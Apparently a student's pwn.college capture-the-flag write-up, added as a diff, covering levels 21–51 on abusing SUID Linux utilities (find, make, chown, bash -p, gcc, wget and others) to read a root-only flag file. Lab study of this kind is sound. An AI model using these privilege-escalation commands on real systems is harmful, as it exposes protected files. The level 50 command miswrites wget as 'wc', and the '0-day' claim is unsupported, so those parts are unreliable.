@@ -237,3 +237,355 @@ tar -cvf flag.tar /flag
 vim flag.tar
 ```
 
+### level21
+
+This time we are using `ar`.
+
+Same approach as above. Create an archive, and then read with `vim`.
+
+```bash
+ar r flag.a /flag
+vim flag.a
+```
+
+### level22
+
+This time we are using `cpio`.
+
+Same approach as above. Create an archive, and then read with `vim`.
+
+```bash
+echo /flag | cpio -o > flag.cpio
+vim flag.cpio
+```
+
+### level23
+
+This time we are using `genisoimage`.
+
+This level was **VERY** interesting. `genisoimage` is an outdated program that creates `iso` disc images. My first naive attempt was to try to create a disc image and `vim` it like usual. However, it just printed the error message that I had no permissino to do so! 
+
+A little bit of more research and watching the office hour session for this challenge revealed that `genisoimage` is SUID-proof. Investigating the system calls of `genisoimage` showed me that it actually gets the user ID and sets the effective user ID as the original user, not the root. So I had to cycle through bunch of flags that would make the operation happen before `genisoimage` does that silly thing. 
+
+And the answer was...
+
+```bash
+genisoimage -sort /flag
+```
+
+- side-notes
+
+The exploit here is actually a 0-day vulnerability. I did not actually use the SUID power that `pwn.college` allowed me, but exploited an actual vulnerability that the program originally had. There is a reason why this is outdated!
+
+### level24
+
+This time we are using `env`.
+
+`env` alone will just print out all the environmental variables. However, adding `-i` flag lets me execute a command in an empty environmental. 
+
+```bash
+env -i cat /flag
+```
+
+### level25
+
+This time we are using `find`.
+
+We can 'find' a specific file with `find`. Not only that, `-exec [COMMAND] {} +` flag allows me to execte the specified command! 
+
+```bash
+find -name flag -exec cat {} +
+```
+
+### level26
+
+This time we are using `make`.
+
+While most people use `make` to compile, here I will use it to simply run `cat` using the parent SUID power. 
+
+I edit the Makefile to be
+
+```
+all:
+    cat /flag
+```
+
+and simply call
+
+```bash
+make
+```
+
+### level27
+
+This time we are using `nice`.
+
+Another scheduling program that lets me execute a command in the name of the Almighty. 
+
+```bash
+nice cat /flag
+```
+
+### level28
+
+This time we are using `timeout`.
+
+This program lets us execute a command within a specific time interval. The man page did not tell me what the unit of measurement is, so I just used 1 like this:
+
+```bash
+timeout 1 cat /flag
+```
+
+But whatever it is, I guess `cat` is fast enough and I got my flag.
+
+### level29
+
+This time we are using `stdbuf`.
+
+This program lets us execute a command in a modified buffering for its standard streams. I did not want to deal with any modified behaviours, so I used `L` mode to make my standard out stream unbuffered. 
+
+```bash
+stdbuf -o L cat /flag
+```
+
+### level30
+
+This time we are using `setarch`.
+
+'`setarch` modifies execution domains and process personality flags.' (I do not quite understand what it exactly does). Since I am only interested in running `cat`, most architecture types should be OK
+
+```bash
+setarch i386 cat /flag
+```
+
+### level31
+
+This time we are using `watch`.
+
+This program will execute a specified command over a certain time interval, default being every 2 seconds. `-x` lets us to specify which command. 
+
+```bash
+watch -x cat /flag
+```
+
+### level32
+
+This time we are using `socat`.
+
+`socat` lets me to redirect input and output from different type of system resources like network, *file*, command, socket, and etc. A little bit of googling taught me how to redirect a file as an input. 
+
+```bash
+socat PIPE:/flag STDOUT
+```
+
+### level33
+
+This time we are using `whiptail`.
+
+`whiptail` displays a text or a file in a dialog box.
+
+```bash
+whiptail --textbox /flag 12 8
+```
+
+The numbers at the end were required to set the dialog box size.
+
+### level34
+
+This time we are using `awk`.
+
+`awk` allows us to read from a file and perform operations on them. For this challenge, I am only interested in reading. 
+
+```bash
+awk '{ print $0 }' /flag
+```
+
+### level35
+
+This time we are using `sed`. 
+
+`sed` allows me to perform a text manipulation. Since our flag text starts with `pwn` at the beginning, I decided to change `pwn` to `gwn`. 
+
+```bash
+sed 's/pwn/gwn/g' /flag
+```
+
+When `sed` prints the outcome, change `gwn` part back to `pwn`. 
+
+### level36
+
+This time we are using `ed`. 
+
+Another text manipulation program. `ed` is used by adding texts, either from STDIO or from a file to the buffer to perform edits. Calling
+
+```bash
+ed /flag
+```
+
+will add `/flag` contents to the buffer and entering `p` will let us view the buffer. 
+
+### level37
+
+This time we are using `chown`.
+
+This is the killer utility. It changes the ownership of a file. I simply made `/flag` mine and `cat`.
+
+```bash
+chown hacker /flag
+cat /flag
+```
+
+### level38
+
+This time we are using `chmod`.
+
+The plan is to change the read permission of others and simply `cat` the flag.
+
+```bash
+chmod o=r /flag
+cat /flag
+```
+
+### level39
+
+This time we are using `cp`.
+
+It is a famous utility that lets us to copy files. I tried making a copy of `/flag`, but it seems that the copy also inherits the same permissions as the original. However, copying the contents of `/flag` into another file can bypass that. 
+
+```bash
+touch a.txt
+cp /flag a.txt
+cat a.txt
+```
+
+### level40
+
+This time we are using `mv`.
+
+Another very interesting level. I was stuck for a couple of minutes looking through the man page to find a way to display a file using `mv`. However, such feature does not exist in `mv`. What is possible however, is run the challenge binary to set the SUID for `/usr/bin/mv`, and use the root privilege to change the name of `/usr/bin/cat` program to `/usr/bin/mv`! Then run the challenge binary once again to set the SUID of `mv` (which is actually `cat`).
+
+```bash
+mv /usr/bin/cat /usr/bin/mv
+/challenge/babysuid_level40
+mv /flag
+```
+
+### level41
+
+This time we are using `perl`.
+
+We can run a simple `perl` programs with `-e` commandline option. As I am not very familiar with `perl`, I googled and found this:
+
+```bash
+perl -n -e 'print "$. - $_"' /flag
+```
+
+### level42
+
+This time we are using `python`.
+
+Python!! Writing a simple script that reads `/flag` would do.
+
+```python
+from subprocess import *
+Popen(["cat", "/flag"])
+```
+
+### level43
+
+This time we are using `ruby`.
+
+I had to write a short ruby script. 
+
+```ruby
+exec "cat /flag"
+```
+
+### level44
+
+This time we are using `bash`.
+
+In the lecture, the professor pointed out that shell programs like `bash` resets the EUID to the original UID. Adding `-p` when invoking disables that feature.
+
+```bash
+bash -p
+cat /flag
+```
+
+### level45
+
+This time we are using `date`.
+
+This program also let's me to specify a file to print out the date inside the file. Although the contents in `/flag` are not in date format, the program still prints the contents as it gives error. 
+
+```bash
+date --file=/flag
+```
+
+### level46
+
+This time we are using `dmesg`.
+
+Same as above. View the system log using `/flag` as the input file.
+
+```bash
+dmesg --file=/flag
+```
+
+### level47
+
+This time we are using `wc`.
+
+`--files0-from` lets me to put `/flag` as the input.
+
+```bash
+wc --files0-from /flag
+```
+
+### level48
+
+This time we are using `gcc`.
+
+I will make `gcc` force include `/flag` and print out the contents through error. I will just use a random source code c file for source.
+
+```bash
+gcc -include /flag a.c
+```
+
+### level49
+
+This time we are using `as`.
+
+Same approach as above. Use `-n` option to include `/flag` as the header file and cause `as` to output error messages.
+
+```bash
+as -n /flag a.s
+```
+
+### level50
+
+This time we are using `wget`.
+
+This is a network downloader. We can establish a server on localhost posting `/flag`, and use `nc` on other terminal to get the file.
+
+```bash
+wc --post-file=/flag http://localhost
+```
+
+And on the other terminal,
+
+```bash
+nc -lp 80
+```
+
+Since we are using `http`, port 80 is used.
+
+### level51
+
+This time we are using `ssh-keygen`.
+
+Final level! However, I did not understand the mechanism behind this level as I lack the background knowledge. I referred to the office hour video for the [solution](https://dojo.pwn.college/challenges/misuse), and I am planning to come back to it after I study more in-depth C programming. 
+
+## Final Notes
+
+I got to learn many new Linux commands and utilities in this module. This gave me a rough idea on how hackers could go on to abuse the SUID for *privilege escalation*. With this knowledge gained, let's step forward to the next unit, Assemblies! 
